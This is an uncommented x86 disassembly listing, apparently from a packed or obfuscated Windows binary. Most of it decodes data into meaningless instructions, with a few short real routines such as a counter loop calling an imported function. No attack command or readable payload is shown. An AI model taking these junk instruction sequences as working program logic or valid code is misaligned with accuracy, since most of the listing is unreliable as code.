  40512e:	adc    DWORD PTR [esi-0x3ddf33da],esp
  405134:	repnz mov bp,0xc603
  405139:	call   0x41d1:0x8fedbf81
  405140:	mov    ebp,0x3eb8799e
  405145:	mov    ds:0x4981bdfa,eax
  40514a:	stos   BYTE PTR es:[edi],al
  40514b:	pop    edi
  40514c:	dec    esp
  40514d:	sahf   
  40514e:	push   ebx
  40514f:	jl     0x4051c3
  405151:	add    bh,BYTE PTR [edx+eax*1+0x69]
  405155:	clc    
  405156:	call   0x93eb5eaf
  40515b:	call   FWORD PTR [edi+0x372c1b92]
  405161:	cld    
  405162:	mov    eax,ds:0x823855c2
  405167:	clc    
  405168:	fisubr WORD PTR [eax-0x5d]
  40516b:	aam    0xcd
  40516d:	push   eax
  40516e:	inc    esi
  40516f:	test   cl,bl
  405171:	test   DWORD PTR [eax+0x36],ecx
  405174:	iret   
  405175:	jle    0x4051e2
  405177:	xchg   edi,eax
  405178:	push   cs
  405179:	lds    edx,FWORD PTR [ecx+0x6f]
  40517c:	xor    al,0x1b
  40517e:	fist   WORD PTR [ecx]
  405180:	add    DWORD PTR [edi-0x5341d705],ebp
  405186:	ins    BYTE PTR es:[edi],dx
  405187:	jno    0x405205
  405189:	(bad)  
  40518a:	ficomp DWORD PTR [ebx]
  40518c:	aad    0xaa
  40518e:	pusha  
  40518f:	in     eax,0x35
  405191:	dec    edx
  405192:	lock mov bh,0x97
  405195:	(bad)  
  405196:	xchg   ebp,eax
  405197:	jl     0x405173
  405199:	xor    eax,0x56934586
  40519e:	xor    dh,dl
  4051a0:	in     eax,dx
  4051a1:	test   DWORD PTR [esi+0x1f2796f4],ebp
  4051a7:	cmp    esi,ebx
  4051a9:	add    ah,BYTE PTR [edi]
  4051ab:	cmp    ch,BYTE PTR [edx+0x520775bf]
  4051b1:	ja     0x405198
  4051b3:	loop   0x405229
  4051b5:	(bad)  
  4051b6:	(bad)  
  4051b7:	lock out dx,eax
  4051b9:	and    BYTE PTR [edi-0x1b],ah
  4051bc:	cmp    esi,DWORD PTR [ebx+0x5c866abb]
  4051c2:	in     al,0x4d
  4051c4:	(bad)  
  4051c5:	div    BYTE PTR ds:0x18ba87ef
  4051cb:	inc    ebx
  4051cc:	mov    ebx,0x55045ec7
  4051d1:	fistp  WORD PTR [ecx]
  4051d3:	push   edx
  4051d4:	rcl    BYTE PTR [ecx-0x47],1
  4051d7:	lock adc ah,al
  4051da:	sbb    dh,dl
  4051dc:	cs mov esp,0x4aa86453
  4051e2:	pop    esp
  4051e3:	inc    ecx
  4051e4:	mov    ecx,0xc29c29c1
  4051e9:	ins    BYTE PTR es:[edi],dx
  4051ea:	test   eax,0x9268773e
  4051ef:	inc    ecx
  4051f0:	push   ebp
  4051f1:	xor    BYTE PTR ss:[ebx],dl
  4051f4:	jle    0x4051c0
  4051f6:	add    ecx,eax
  4051f8:	lock test dh,bl
  4051fb:	jo     0x767d9168
  405201:	fild   DWORD PTR [ebp+0x2a]
  405204:	lea    eax,[eax+edx*1+0x32729a]
  40520b:	mov    DWORD PTR [ebp+0x8],eax
  40520e:	inc    DWORD PTR [ebp+0xc]
  405211:	jmp    0x404c37
  405216:	mov    eax,DWORD PTR [ebp-0x10]
  405219:	xor    eax,ecx
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	dec    esi
  40523c:	aad    0xab
  40523e:	adc    eax,edx
  405240:	sub    bh,BYTE PTR [esp+edi*2-0x4b]
  405244:	jns    0x4052c2
  405246:	jl     0x405223
  405248:	dec    ebx
  405249:	ror    BYTE PTR [ebx+0x13],0x51
  40524d:	out    0xa1,eax
  40524f:	lods   eax,DWORD PTR ds:[esi]
  405250:	pop    es
  405251:	mov    dh,0xe3
  405253:	mov    ds:0x755d5309,eax
  405258:	dec    esp
  405259:	test   al,0x3a
  40525b:	pop    ss
  40525c:	add    cl,BYTE PTR [edx+0x77d33f64]
  405262:	pop    ebx
  405263:	inc    esi
  405264:	cmp    al,0x7e
  405266:	mov    WORD PTR [edi+ecx*8-0x7c],ss
  40526a:	and    ah,BYTE PTR [ecx+ebx*1+0x230189fc]
  405271:	mov    dh,0xc2
  405273:	out    dx,eax
  405274:	xor    dh,bl
  405276:	cmp    bh,BYTE PTR [edx+0x656f2b51]
  40527c:	inc    eax
  40527d:	lods   al,BYTE PTR ds:[esi]
  40527e:	xchg   ebx,eax
  40527f:	(bad)  
  405280:	or     al,0xe8
  405282:	daa    
  405283:	jne    0x4052ce
  405285:	jmp    0x417a1bb3
  40528a:	loop   0x405213
  40528c:	mov    esi,0x14ec2ec7
  405291:	sbb    eax,0x3809f44d
  405296:	stos   DWORD PTR es:[edi],eax
  405297:	mov    bh,0x7
  405299:	add    edx,DWORD PTR [eax]
  40529b:	sbb    bh,BYTE PTR [edi+0x2bf19e11]
  4052a1:	mov    bh,0xae
  4052a3:	cs data16 inc cl
  4052a7:	pop    ebx
  4052a8:	mov    eax,DWORD PTR [ebx-0xc]
  4052ab:	cmp    edx,DWORD PTR [ecx-0x46f8af2]
  4052b1:	inc    ebp
  4052b2:	xchg   ebx,eax
  4052b3:	adc    dh,BYTE PTR [eax]
  4052b5:	iret   
  4052b6:	pop    ebp
  4052b7:	push   ebx
  4052b8:	mov    edx,0x2f224d9e
  4052bd:	dec    ebp
  4052be:	mov    cl,0x79
  4052c0:	lock inc ebp
  4052c2:	mov    bl,0x5c
  4052c4:	xchg   edx,eax
  4052c5:	dec    esi
  4052c6:	aad    0x32
  4052c8:	lea    eax,[ebx-0x743ac1f3]
  4052ce:	inc    edx
  4052cf:	sub    esp,DWORD PTR [edx]
  4052d1:	push   eax
  4052d2:	in     al,dx
  4052d3:	arpl   WORD PTR [eax-0x31],bp
  4052d6:	jle    0x4052b4
  4052d8:	push   eax
  4052d9:	adc    cl,BYTE PTR [esi+0x7]
  4052dc:	rol    eax,1
  4052de:	sub    ah,BYTE PTR [ebp+0x55]
  4052e1:	sbb    BYTE PTR [esi+0x14],cl
  4052e4:	je     0x4052a6
  4052e6:	into   
  4052e7:	xor    DWORD PTR [edi-0x14],edx
  4052ea:	ret    0x3872
  4052ed:	loop   0x405343
  4052ef:	lock shr WORD PTR [edi+0x46c6f29c],cl
  4052f7:	test   eax,0xd1a0a95a
  4052fc:	fild   DWORD PTR [edi+0x75dd39d1]
  405302:	pop    esp
  405303:	and    ebp,DWORD PTR [eax-0x5d]
  405306:	rol    BYTE PTR [ecx-0x6],0x5f
  40530a:	clc    
  40530b:	xchg   edi,eax
  40530c:	mov    ds:0x1d85b399,al
  405311:	test   DWORD PTR [ebx+edi*2+0x3c],edi
  405315:	in     al,dx
  405316:	adc    BYTE PTR [ebp+0xf8a7635],al
  40531c:	rol    DWORD PTR [ebp-0x22],0x1f
  405320:	jbe    0x405334
  405322:	(bad)  
  405323:	call   0x5670:0x504e
  405329:	pop    esi
  40532a:	fnsave [edi-0x21]
  40532d:	pop    edx
  40532e:	bound  ecx,QWORD PTR [esi-0x5c]
  405331:	sti    
  405332:	pop    esp
  405333:	inc    ecx
  405334:	pop    edi
  405335:	mov    edi,0xe5efac22
  40533a:	add    al,0x9e
  40533c:	fs stc 
  40533e:	int    0xee
  405340:	aaa    
  405341:	leave  
  405342:	xor    al,0xbd
  405344:	jb     0x4052ec
  405346:	stos   BYTE PTR es:[edi],al
  405347:	pop    ebx
  405348:	dec    edi
  405349:	xor    BYTE PTR [eax+0xd09f4a7],al
  40534f:	test   al,0x8a
  405351:	test   eax,0x251fb4e9
  405356:	aaa    
  405357:	(bad)  
  405358:	outs   dx,DWORD PTR ds:[esi]
  405359:	std    
  40535a:	inc    esp
  40535b:	xor    BYTE PTR [edi+0x3b],ah
  40535e:	mov    BYTE PTR [edi+0xc],cl
  405361:	lds    esi,FWORD PTR [ebx+edx*2-0x57638f30]
  405368:	ss inc esp
  40536a:	sti    
  40536b:	sub    eax,0x88e54b1f
  405370:	stos   DWORD PTR es:[edi],eax
  405371:	jnp    0x4053b2
  405373:	xchg   esp,eax
  405374:	in     eax,0x40
  405376:	dec    esi
  405377:	add    ecx,DWORD PTR ds:0x522d4b0a
  40537d:	jne    0x4053e9
  40537f:	arpl   WORD PTR [edi+0x6a00683f],dx
  405385:	cs scas eax,DWORD PTR es:[edi]
  405387:	mov    DWORD PTR [edi],edi
  405389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40538a:	jecxz  0x4053c5
  40538c:	sub    BYTE PTR [ebp+edi*2+0x33],dh
  405390:	jmp    0xe52a6282
  405395:	cmp    esi,eax
  405397:	ja     0x405351
  405399:	pusha  
  40539a:	push   eax
  40539b:	dec    edi
  40539c:	jge    0x40533d
  40539e:	pop    es
  40539f:	pushf  
  4053a0:	lock loope 0x405349
  4053a3:	jg     0x4053a0
  4053a5:	inc    ecx
  4053a6:	sub    al,0x36
  4053a8:	ror    DWORD PTR [bx+si+0x43],0x24
  4053ad:	les    ecx,FWORD PTR [esi]
  4053af:	jl     0x40538e
  4053b1:	adc    BYTE PTR es:[esi],ah
  4053b4:	dec    eax
  4053b5:	cmp    DWORD PTR [ebx],esi
  4053b7:	jmp    0x93bc4d05
  4053bc:	sub    ebp,ebx
  4053be:	adc    DWORD PTR [edi-0x47],ebp
  4053c1:	retf   0x52b3
  4053c4:	dec    ebx
  4053c5:	dec    esp
  4053c6:	ficomp WORD PTR [esp+edi*2]
  4053c9:	sub    ebx,ebx
  4053cb:	dec    DWORD PTR ds:0x6b067103
  4053d1:	arpl   WORD PTR [edx],cx
  4053d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053d4:	enter  0x90d2,0xec
  4053d8:	adc    al,0x8f
  4053da:	mov    eax,esp
  4053dc:	inc    edi
  4053dd:	add    eax,0xbbd78270
  4053e2:	inc    edi
  4053e3:	mov    al,0x7a
  4053e5:	or     al,0x3e
  4053e7:	(bad)  
  4053e9:	mov    al,ds:0xaccf0452
  4053ee:	rcl    cl,1
  4053f0:	inc    esp
  4053f1:	ret    0x8d1a
  4053f4:	cmp    al,0xa4
  4053f6:	clc    
  4053f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053f8:	mov    eax,ds:0xbf4957ae
  4053fd:	test   DWORD PTR [edx],edx
  4053ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405400:	ret    
  405401:	add    edx,eax
  405403:	xor    BYTE PTR [ebp+0x1b3fae99],ch
  405409:	xor    BYTE PTR [eax-0x1d54a634],bh
  40540f:	mov    al,ds:0x3b55e746
  405414:	dec    eax
  405415:	dec    esp
  405416:	sbb    ch,BYTE PTR [edi+eiz*8+0x62998371]
  40541d:	mov    cl,0x5a
  40541f:	mov    bh,0x27
  405421:	scas   eax,DWORD PTR es:[edi]
  405422:	daa    
  405423:	mov    bh,0x9f
  405425:	cmp    DWORD PTR [esp+ebp*8+0x722fd20a],0xffffffdf
  40542d:	fadd   st,st(3)
  40542f:	xor    BYTE PTR [edx+0x7e0bb98b],bl
  405435:	stos   DWORD PTR es:[edi],eax
  405436:	fs mov ebp,0x3061544c
  40543c:	and    cl,BYTE PTR [eax]
  40543e:	inc    DWORD PTR [ebx]
  405440:	sbb    esi,edx
  405442:	inc    ebx
  405443:	jp     0x405498
  405445:	mov    ebx,0x2cf39daf
  40544a:	imul   esi,DWORD PTR [ebx+0x7f77a8c4],0xffffffed
  405451:	pop    edx
  405452:	cmp    bh,BYTE PTR [ecx-0x5b]
  405455:	(bad)  [esi]
  405457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405458:	rcl    BYTE PTR [ebp+0x7],0x9f
  40545c:	or     eax,0x747349a8
  405461:	inc    esi
  405462:	fucom  st(5)
  405464:	mov    ah,0x79
  405466:	jnp    0x405479
  405468:	inc    edx
  405469:	mov    bh,0x4f
  40546b:	add    ebx,DWORD PTR [ebx]
  40546d:	loope  0x4054a7
  40546f:	aad    0x2b
  405471:	push   es
  405472:	stos   DWORD PTR es:[edi],eax
  405473:	pop    DWORD PTR [edx]
  405475:	in     eax,dx
  405476:	jno    0x40546d
  405478:	cmp    esp,DWORD PTR [esi-0x1cf7ca4f]
  40547e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40547f:	in     al,0x6
  405481:	retf   0x6a8
  405484:	push   cs
  405485:	cdq    
  405486:	sar    DWORD PTR [esi+0x11ab573c],cl
  40548c:	dec    ecx
  40548d:	jmp    0x4054c6
  40548f:	push   esi
  405490:	jp     0x4054e7
  405492:	ja     0x40546c
  405494:	or     ebp,DWORD PTR [ebx+esi*4]
  405497:	dec    ecx
  405498:	out    0xaa,eax
  40549a:	xchg   edi,eax
  40549b:	fisttp WORD PTR [eax+0x67a66667]
  4054a1:	push   ds
  4054a2:	push   ss
  4054a3:	jbe    0x4054ea
  4054a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054a6:	repnz adc ecx,eax
  4054a9:	jmp    0x356c:0x13faa0e7
  4054b0:	xor    BYTE PTR fs:[edx],ch
  4054b3:	adc    BYTE PTR [esi-0x2b],0x3
  4054b7:	je     0x4054c2
  4054b9:	into   
  4054ba:	sbb    BYTE PTR [esi+0x11],dl
  4054bd:	dec    esi
  4054be:	pop    edi
  4054bf:	sub    esp,DWORD PTR [ebp-0x54bc1cbb]
  4054c5:	ficom  WORD PTR [ecx+ebx*4]
  4054c8:	pop    es
  4054c9:	mov    ebp,DWORD PTR [edx-0xf]
  4054cc:	bound  esi,QWORD PTR [ecx+0x39]
  4054cf:	nop
  4054d0:	pop    ds
  4054d1:	jnp    0x40547f
  4054d3:	les    eax,FWORD PTR [eax-0x73ac653]
  4054d9:	stos   BYTE PTR es:[edi],al
  4054da:	les    eax,FWORD PTR ds:0xe6640536
  4054e0:	(bad)
  4054e3:	cmovb  ecx,DWORD PTR [ebx]
  4054e6:	or     DWORD PTR [ebp+0x0],eax
  4054e9:	mov    cl,BYTE PTR ds:0xd6183249
  4054ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054f0:	ret    
  4054f1:	sub    BYTE PTR [edx],bh
  4054f3:	repz xlat BYTE PTR ds:[ebx]
  4054f5:	fld    QWORD PTR [ebx]
  4054f7:	or     al,dl
  4054f9:	into   
  4054fa:	xor    dl,BYTE PTR [esi]
  4054fc:	sbb    ecx,DWORD PTR [ebx]
  4054fe:	mov    BYTE PTR [edx],ah
  405500:	sbb    ebx,edx
  405502:	mov    cl,0xcb
  405504:	js     0x4054da
  405506:	ds ss dec eax
  405509:	in     al,0xeb
  40550b:	les    esi,FWORD PTR [ecx-0x2e865af0]
  405511:	push   edi
  405512:	or     esi,ebp
  405514:	es in  eax,0x32
  405517:	and    dh,0xb1
  40551a:	outs   dx,BYTE PTR ds:[esi]
  40551b:	mov    eax,0xc84c2e1b
  405521:	sbb    BYTE PTR [edi+0x34f5fb0],cl
  405527:	or     al,0x5e
  405529:	mov    esi,0xb20f3af7
  40552e:	popf   
  40552f:	mov    dh,0x7c
  405531:	or     DWORD PTR [esi+0x7776c17b],esp
  405537:	cmp    DWORD PTR [edx-0x1d661586],edi
  40553d:	pop    esp
  40553e:	add    BYTE PTR [esi+0x41],ch
  405541:	scas   al,BYTE PTR es:[edi]
  405542:	int3   
  405543:	inc    esp
  405544:	loop   0x405504
  405546:	mov    dl,0x6
  405548:	fsub   DWORD PTR [edi-0x65]
  40554b:	sbb    eax,0xd8bece6e
  405550:	sahf   
  405551:	aaa    
  405552:	popf   
  405553:	addr16 nop
  405555:	xor    esi,eax
  405557:	je     0x4055ba
  405559:	sub    al,0x57
  40555b:	jae    0x40557c
  40555d:	es dec ecx
  40555f:	mov    ah,0x35
  405561:	xchg   ebx,eax
  405562:	daa    
  405563:	sbb    al,0x8f
  405565:	xor    dl,BYTE PTR [ebp+0x1d3e3686]
  40556b:	sub    al,0x95
  40556d:	fst    DWORD PTR [eax]
  40556f:	std    
  405570:	jecxz  0x4054f7
  405572:	and    DWORD PTR ds:0x48c65174,ecx
  405578:	dec    ebx
  405579:	mov    dl,0x3a
  40557b:	cli    
  40557c:	repnz sbb al,0xe2
  40557f:	lock jl 0x405505
  405582:	adc    eax,ebx
  405584:	ss xchg esp,eax
  405586:	xor    eax,0x76c8710d
  40558b:	jle    0x40557b
  40558d:	mov    eax,0x506cac7d
  405592:	sbb    al,0x96
  405594:	outs   dx,DWORD PTR ds:[esi]
  405595:	adc    BYTE PTR [edi-0x15],0xd0
  405599:	xchg   ebx,eax
  40559a:	int3   
  40559b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40559d:	dec    eax
  40559e:	sub    eax,0x92d8f35
  4055a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a4:	mov    eax,ds:0x4b15d575
  4055a9:	xor    al,0x20
  4055ab:	arpl   WORD PTR [ebp+0x4ae5af42],di
  4055b1:	in     al,0x14
  4055b3:	mov    dh,0x2d
  4055b5:	clc    
  4055b6:	mov    ebx,0x8fcad4fd
  4055bc:	sub    eax,DWORD PTR [edx+ebp*4]
  4055bf:	into   
  4055c0:	shl    ch,cl
  4055c2:	jae    0x40555f
  4055c4:	cdq    
  4055c5:	pop    es
  4055c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055c7:	mov    eax,ds:0x213d5422
  4055cc:	cmp    edx,DWORD PTR [ebp+0x26]
  4055cf:	rcr    DWORD PTR [edx-0x6e3206d0],0xc5
  4055d6:	in     eax,dx
  4055d7:	add    edx,edx
  4055d9:	inc    ebp
  4055da:	jmp    0xcc0a4a27
  4055df:	test   DWORD PTR [ebx+ecx*1-0x7c],eax
  4055e3:	dec    ecx
  4055e4:	sbb    ebx,DWORD PTR [eax+ebp*4-0x573060f8]
  4055eb:	and    eax,0xae68e718
  4055f0:	cmp    DWORD PTR [ebx-0x7e93ed4b],eax
  4055f6:	ins    BYTE PTR es:[edi],dx
  4055f7:	push   ss
  4055f8:	out    0xbf,al
  4055fa:	out    0x32,eax
  4055fc:	fadd   DWORD PTR [edi+0x25815151]
  405602:	arpl   WORD PTR [esi],si
  405604:	inc    ebx
  405605:	add    BYTE PTR [eax],al
  405607:	add    BYTE PTR [eax],al
  405609:	add    BYTE PTR [ecx+0x433663],ah
  40560f:	inc    eax
  405610:	mov    ds:0x433663,eax
  405615:	cmp    DWORD PTR ds:0x433663,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x433663,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x433663
  405642:	inc    eax
  405643:	mov    ds:0x433663,eax
  405648:	cmp    DWORD PTR ds:0x433663,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	pusha  
  405670:	mov    eax,ds:0x36095abb
  405675:	jl     0x4056f3
  405677:	mov    ch,0x79
  405679:	jl     0x4056f7
  40567b:	arpl   WORD PTR [ebx+0x7f940bb6],si
  405681:	ficom  WORD PTR [ecx-0x5f]
  405684:	mov    dl,0xa9
  405686:	cli    
  405687:	call   0xe3394c76
  40568c:	or     esp,DWORD PTR [eax]
  40568e:	pop    esi
  40568f:	aam    0x87
  405691:	pop    esp
  405692:	cmp    dl,BYTE PTR [ecx-0x4b]
  405695:	pop    edi
  405696:	and    al,0x96
  405698:	pop    eax
  405699:	int3   
  40569a:	aad    0xcd
  40569c:	dec    esp
  40569d:	scas   eax,DWORD PTR es:[edi]
  40569e:	call   0x91d3:0x96f42760
  4056a5:	dec    eax
  4056a6:	dec    esp
  4056a7:	pop    edi
  4056a8:	mov    dl,0x73
  4056aa:	cmp    eax,0x5d794423
  4056af:	es pop eax
  4056b1:	lea    edi,[edx+0x2c043e41]
  4056b7:	mov    eax,ds:0x3e54aec8
  4056bc:	or     eax,0xe1e2b850
  4056c1:	mov    dl,0x1
  4056c3:	gs mov ebp,ebx
  4056c6:	div    DWORD PTR [edx*2-0x136a76cb]
  4056cd:	sbb    eax,0xa52e5468
  4056d2:	xchg   edi,eax
  4056d3:	xchg   ebp,eax
  4056d4:	fdivr  QWORD PTR [eax+0x50]
  4056d7:	ret    0xf905
  4056da:	xchg   ecx,eax
  4056db:	or     eax,0x37a97056
  4056e0:	pop    ebx
  4056e1:	push   es
  4056e2:	cmp    esp,edi
  4056e4:	out    0x8a,eax
  4056e6:	pop    edx
  4056e7:	scas   eax,DWORD PTR es:[edi]
  4056e8:	lock or ebx,DWORD PTR [ecx]
  4056eb:	mov    BYTE PTR [ebx-0x2cfd58f5],ch
  4056f1:	pop    ebx
  4056f2:	jne    0x40567c
  4056f4:	dec    esp
  4056f5:	(bad)  
  4056f6:	cmp    eax,0xfc8cd86c
  4056fb:	sub    edx,eax
  4056fd:	mov    esi,0xa92cf17
  405702:	in     al,0xed
  405704:	mov    ch,0x4f
  405706:	out    0xd0,al
  405708:	and    esi,DWORD PTR [edx+0xaede32f]
  40570e:	retf   
  40570f:	mov    ?,WORD PTR [eax-0x24]
  405712:	inc    esi
  405713:	stc    
  405714:	sbb    BYTE PTR [ecx+0x27],dh
  405717:	pop    esi
  405718:	add    dh,BYTE PTR [esi]
  40571a:	fistp  QWORD PTR [eax+ebx*1+0x27b78353]
  405721:	je     0x40579b
  405723:	push   0xd5b12509
  405728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405729:	loopne 0x4056e9
  40572b:	mov    WORD PTR [ecx+ebp*1+0x3f],?
  40572f:	pop    ebx
  405730:	pop    ebp
  405731:	pop    es
  405732:	stc    
  405733:	cmp    edx,edx
  405735:	push   0xfffffff8
  405737:	jno    0x405779
  405739:	and    ch,BYTE PTR [esi-0x7f]
  40573c:	(bad)  [ecx]
  40573e:	sub    eax,0x34e58d75
  405743:	add    BYTE PTR [edx],dh
  405745:	fdiv   QWORD PTR ds:0x88b9f2ae
  40574b:	outs   dx,DWORD PTR ds:[esi]
  40574c:	sti    
  40574d:	mov    eax,ds:0x9c04f6f
  405752:	jecxz  0x405780
  405754:	mov    ebp,0xcff46967
  405759:	fist   DWORD PTR [esi]
  40575b:	cmp    bl,bh
  40575d:	and    BYTE PTR [eax+0x7a47757],bh
  405763:	js     0x40574b
  405765:	out    dx,al
  405766:	xor    edi,esi
  405768:	leave  
  405769:	vpmaddwd ymm6,ymm0,ymm5
  40576d:	int3   
  40576e:	jno    0x40574e
  405770:	outs   dx,DWORD PTR ds:[esi]
  405771:	bnd jb 0x4057ef
  405774:	test   DWORD PTR [ecx-0x27e3d802],0x50989e11
  40577e:	ret    0x26cb
  405781:	or     ch,ah
  405783:	and    bh,ah
  405785:	daa    
  405786:	jle    0x40572b
  405788:	inc    edx
  405789:	iret   
  40578a:	add    eax,0x1405747c
  40578f:	jne    0x405766
  405791:	xor    DWORD PTR [ebx],eax
  405793:	mov    ?,WORD PTR [edx+0x5d44c712]
  405799:	mov    cl,0xfa
  40579b:	sub    cl,BYTE PTR [esi+0x70]
  40579e:	fmulp  st(3),st
  4057a0:	pusha  
  4057a1:	mov    bh,0x59
  4057a3:	outs   dx,DWORD PTR ds:[esi]
  4057a4:	iret   
  4057a5:	aam    0xce
  4057a7:	(bad)  
  4057a8:	pushf  
  4057a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057aa:	jns    0x405808
  4057ac:	sar    DWORD PTR [ecx-0x24241a2c],cl
  4057b2:	jl     0x40582d
  4057b4:	das    
  4057b5:	and    al,0x79
  4057b7:	fstp   DWORD PTR [edx-0x60]
  4057ba:	inc    DWORD PTR [ebx+edx*4-0x5]
  4057be:	pop    edi
  4057bf:	xchg   esp,eax
  4057c0:	sub    DWORD PTR [ebx+0x59bbe873],esi
  4057c6:	mov    WORD PTR [esi-0x1a],es
  4057c9:	mov    ds,WORD PTR [esi+0x7925d988]
  4057cf:	inc    DWORD PTR [edi+0x238f056a]
  4057d5:	lahf   
  4057d6:	inc    esi
  4057d7:	repnz cmp eax,0x7e68ef77
  4057dd:	je     0x40580a
  4057df:	mov    cl,0x48
  4057e1:	ja     0x405801
  4057e3:	popf   
  4057e4:	sbb    bh,BYTE PTR [esi]
  4057e6:	cmp    ah,BYTE PTR [edi-0x1b]
  4057e9:	or     BYTE PTR [eax-0x73],dh
  4057ec:	lock repnz aam 0xcf
  4057f0:	push   eax
  4057f1:	ret    
  4057f2:	and    bh,BYTE PTR [ecx-0x66]
  4057f5:	fstp   DWORD PTR [ebp-0x3]
  4057f8:	das    
  4057f9:	outs   dx,DWORD PTR ds:[esi]
  4057fa:	(bad)  
  4057fb:	mov    ebx,0x6a80ca0c
  405800:	mov    BYTE PTR [esi-0x73a19249],0xb2
  405807:	clc    
  405808:	int    0x7b
  40580a:	pop    edx
  40580b:	aam    0x98
  40580d:	test   al,0xc4
  40580f:	cmp    dl,BYTE PTR [edx+0x2d]
  405812:	into   
  405813:	(bad)  
  405814:	int    0x92
  405816:	mov    ecx,0x62e4f6e5
  40581b:	pop    esi
  40581c:	loope  0x40583a
  40581e:	leave  
  40581f:	add    DWORD PTR [ebp-0x26751682],ebp
  405825:	adc    bl,BYTE PTR [ebp+0x2f]
  405828:	lea    ebp,[ecx]
  40582a:	ror    BYTE PTR [ebp+0x47],1
  40582d:	mov    esi,0xd007c1b4
  405832:	mov    esi,esi
  405834:	jnp    0x4057bf
  405836:	sub    BYTE PTR [ecx-0x6d44f65c],bh
  40583c:	jb     0x4057c1
  40583e:	or     bh,BYTE PTR [edx+edi*1-0x7d]
  405842:	hlt    
  405843:	in     al,0xec
  405845:	out    0x31,eax
  405847:	adc    ch,BYTE PTR [eax-0x42]
  40584a:	out    0xf3,al
  40584c:	ror    BYTE PTR [ecx+0x73],0x1c
  405850:	mov    ds:0xf0427243,al
  405855:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405857:	push   ss
  405858:	leave  
  405859:	jns    0x405885
  40585b:	push   es
  40585c:	adc    edx,ebp
  40585e:	retf   
  40585f:	das    
  405860:	pop    ds
  405861:	sbb    ebx,DWORD PTR [ebx+0x52]
  405864:	xlat   BYTE PTR ds:[ebx]
  405865:	jmp    0x5eb3:0x7f564f58
  40586c:	xor    cl,bh
  40586e:	mov    cl,0xdb
  405870:	jae    0x405829
  405872:	aas    
  405873:	call   DWORD PTR [ecx+ebp*2-0x34080238]
  40587a:	out    0xc5,eax
  40587c:	sbb    bl,ah
  40587e:	mov    bl,0x3f
  405880:	ret    0x8b42
  405883:	add    DWORD PTR [esi-0x51448513],eax
  405889:	inc    esi
  40588a:	test   BYTE PTR [esi+0x4c79d9a8],al
  405890:	test   cl,bl
  405892:	sti    
  405893:	push   esp
  405894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405895:	jg     0x4058b6
  405897:	mov    bh,0x8e
  405899:	jmp    0xa6e837c0
  40589e:	pop    edi
  40589f:	scas   al,BYTE PTR es:[edi]
  4058a0:	cmc    
  4058a1:	sbb    DWORD PTR [ecx-0x28],esi
  4058a4:	repz jo 0x4058a8
  4058a7:	xor    esp,DWORD PTR [eax]
  4058a9:	lahf   
  4058aa:	dec    esi
  4058ab:	hlt    
  4058ac:	mov    ds:0x612e4330,eax
  4058b1:	pop    ecx
  4058b2:	test   BYTE PTR [esi],dl
  4058b4:	sub    eax,0x9ad7db4
  4058b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ba:	call   DWORD PTR [edi-0x71ba42b7]
  4058c0:	jnp    0x405879
  4058c2:	enter  0xc69,0xfe
  4058c6:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4058c8:	js     0x4058f0
  4058ca:	idiv   DWORD PTR [eax+esi*4+0x3100f897]
  4058d1:	pop    ds
  4058d2:	retf   
  4058d3:	fimul  DWORD PTR [ebx]
  4058d5:	test   al,0x9d
  4058d8:	mov    BYTE PTR [ecx],cl
  4058da:	lock push esp
  4058dc:	cmc    
  4058dd:	(bad)  
  4058de:	dec    ebp
  4058df:	xchg   DWORD PTR [edi+ecx*2],edi
  4058e2:	idiv   BYTE PTR [esi+0x3167eb3a]
  4058e8:	loope  0x405919
  4058ea:	sahf   
  4058eb:	aaa    
  4058ec:	push   ebx
  4058ed:	leave  
  4058ee:	pop    esp
  4058ef:	pusha  
  4058f0:	xchg   DWORD PTR [edx+0x66],esp
  4058f3:	in     al,dx
  4058f4:	add    DWORD PTR [esi-0x3eda081f],eax
  4058fa:	push   0x2c02e9ab
  4058ff:	addr16 pop ds
  405901:	mov    edx,0xc9d006cd
  405906:	adc    ah,cl
  405908:	rcr    BYTE PTR [ecx-0x6c],1
  40590b:	cld    
  40590c:	inc    esp
  40590d:	sub    esp,DWORD PTR [eax+eax*1-0x4ae93ad5]
  405914:	cmp    al,0x42
  405916:	inc    esp
  405917:	shr    DWORD PTR [esi+0x15],cl
  40591a:	sahf   
  40591b:	fstp   TBYTE PTR [eax+0x4b7d8a6b]
  405921:	imul   ebx,DWORD PTR [ecx-0x73],0x4c
  405925:	nop
  405926:	dec    ecx
  405927:	mov    esp,0xd4e67ad4
  40592c:	push   ds
  40592d:	aad    0x81
  40592f:	cdq    
